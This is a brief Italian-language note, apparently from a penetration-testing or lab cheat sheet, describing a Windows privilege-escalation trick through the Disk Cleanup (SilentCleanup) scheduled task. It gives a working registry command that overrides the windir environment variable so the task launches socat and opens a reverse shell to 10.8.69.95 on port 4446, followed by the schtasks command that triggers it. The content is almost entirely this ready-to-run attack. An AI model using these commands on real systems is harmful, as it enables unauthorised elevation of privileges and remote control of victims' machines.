### **TASK SCHEDULER : DISK CLEANUP**

Sostituisci la variabile, in questo caso %windir% con il cmd e invia il comando per una revshell
```powershell
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.69.95:4446 EXEC:cmd.exe,pipes &REM " /f
```
avvia il programa shedulato
```powershell
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```